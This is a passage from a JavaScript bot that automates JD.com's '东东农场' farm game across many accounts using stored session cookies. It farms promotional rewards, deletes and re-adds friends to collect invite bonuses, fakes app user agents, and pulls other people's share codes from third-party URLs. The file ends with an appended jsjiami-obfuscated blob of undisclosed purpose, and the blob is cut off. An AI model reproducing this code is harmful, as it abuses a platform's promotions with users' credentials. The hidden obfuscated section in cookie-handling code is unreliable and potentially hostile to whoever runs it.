    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://cdn.jsdelivr.net/gh/wuzhi-docker1/RandomShareCode@main/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xode='jsjiami.com.v6',_0x57a9=[_0xode,'w6LCpEp2wqU=','w6VBwqMeAg==','wqLChW1VQw==','DsOLw7XDqkE=','w7rCpBwucMOM','EGBl','wr7DlcKYRRTCjXhOw47DisK2wq9s','w7p+Sg==','w6jDt8Kywo0sw5p+wq4Zw4DCj8KhwpA=','wqpAFFR8','Y8OCAUsV','wqhCGERAJMKEUCbCkw==','w7h1SMK+TcKqWg==','wpTCiU98RQ==','w5vDhRnChcKtOVk=','wphIDnhp','MMOifcK+TQ==','wrg4AQvDhVpMUcODwqZ7w6jCkz1Bw6d1w70RwrHDvVx9w6PDtUXCjBQqDi9mw67Ct17Cvz/Dm8OofCcsHMK6VcKowqXDlEnDicO4w4bDiBPCiHHDssKKTMKMfsK3MsOFw7zCjMOmKMKwUEwhwrU3fzTChyPCkcOrEwRtJGQjwrDCgQY=','w5lCwphzw6A=','wpLDpMKpczPCoUV/w4bDqcOOwolddgwhwpDDrMO6wp3Dpn/DsHrDssO5d8Oxw5DDkcOZw6Z6S1PDsQnCt8OgH8OPw4QIw6M=','wqHDpsKQcjgePsO7HMOXFQ19JWNCwrzCuMOBNlnDhnDDkMKjeV48EcK2QEUtwqlewo5fPMOHw6zDiWjDrsOZWcO2w43DskU6w5lWwrrDlcKZAMK2w4cdBW1UF3bCgmvCg8KxM0Zxe8K/N1LCtsO6YEFEwoQZwqrDjknDvQ==','w6rCpMOnfQo=','wpzClllFUg==','MMO1wrfCqsOK','w6/CpcOVWSsB','ScOUwrAu','EcKfwphiwqs=','w7ZBwr3DoUg=','fcKJw53Ds8Ou','DMO8wqPClcON','wqrDlMKp','bcK6UnA=','DsKlw4TDv+itjeaykuWmsei3pu+/keitseajmeadlue8o+i1l+mFguitsA==','VsOCwpoYBA==','wr/CsVlkdQ==','GMOJw4PDmn4=','woTDs8Kx','YMOkWkc=','wrPClgII6K+j5rOr5aS96LSh77256K605qKu5p2P572Z6Laz6Yaa6K2+','EHnDujNV','RnzDpRx2woA=','ccKnw5vCpmU=','TcK7a8KJDA==','w4tiwoVsw4U=','XsONw4Y=','w4Juwr1s','F8O